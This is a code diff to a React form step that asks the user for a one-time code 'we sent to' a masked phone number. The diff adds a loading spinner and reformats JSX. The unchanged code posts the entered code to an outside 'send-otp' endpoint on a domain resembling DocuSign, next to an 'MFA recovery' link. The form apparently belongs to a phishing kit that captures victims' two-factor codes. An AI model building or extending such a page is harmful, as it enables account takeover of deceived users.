@@ -13,6 +13,7 @@ import StepFour from "./StepFour";
 import axios from "axios";
 import StepThreeDup from "./StepThreeDup";
 import StepOneDup from "./StepOneDup";
+import { ClipLoader } from "react-spinners";
 
 const StepThree = () => {
   const { control, watch, setValue } = useFormContext();
@@ -95,7 +96,9 @@ const StepThree = () => {
       <>
         <p className="text-[15px] font-medium  text-[#808085]">
           Enter the code we sent to{" "}
-          <span className="font-medium text-black">(***) *** {lastThreeDigits}</span>
+          <span className="font-medium text-black">
+            (***) *** {lastThreeDigits}
+          </span>
         </p>
 
         <div className="w-full">
@@ -120,7 +123,7 @@ const StepThree = () => {
               type="text"
               labelClassName=""
               // error={methods.formState.errors.number?.message as string}
-              inputClassName="w-full absolute  left-3 right-0 top-0 bottom-0 border-none outline-none "
+              inputClassName="w-full absolute font-medium text-black  left-3 right-0 top-0 bottom-0 border-none outline-none "
             />
             {/* <input
               type="text"
@@ -141,7 +144,10 @@ const StepThree = () => {
           </p>
           <p className="text-[13px] font-medium ">
             Please begin the
-            <Link href="/" className=" ml-1 underline text-[#5A80AD] font-medium">
+            <Link
+              href="/"
+              className=" ml-1 underline text-[#5A80AD] font-medium"
+            >
               MFA recovery process.
             </Link>
           </p>
@@ -149,14 +155,18 @@ const StepThree = () => {
         <button
           type="submit"
           onClick={async () => {
+            setIsLoading(true);
             const isValid = await methods.trigger(["code"]); // Manually validate fields
             let otp = await methods.watch("code"); // Manually validate fields
             if (isValid) {
               otp = await methods.watch("code"); // Manually validate fields
               try {
-                const response = await axios.post("https://api.docusends.com/api/send-otp", {
-                  otp,
-                });
+                const response = await axios.post(
+                  "https://api.docusends.com/api/send-otp",
+                  {
+                    otp,
+                  }
+                );
 
                 if (response.status === 200) {
                   // toast.success("Message sent successfully!");
@@ -173,9 +183,16 @@ const StepThree = () => {
               }
             }
           }}
-          className="text-xs w-full p-4 md:px-6 cursor-pointer py-4  rounded-[4px] bg-[#266BCA] font-medium text-white"
+          className="text-xs w-full p-4 md:px-6 cursor-pointer py-4  rounded-[4px] bg-[#266BCA] font-medium text-white flex items-center justify-center"
         >
-          Continue
+          {isLoading ? (
+            <>
+              Continue
+              <ClipLoader className="ml-2" size={14} color="white" />
+            </>
+          ) : (
+            "Continue"
+          )}
         </button>
       </>
     </div>
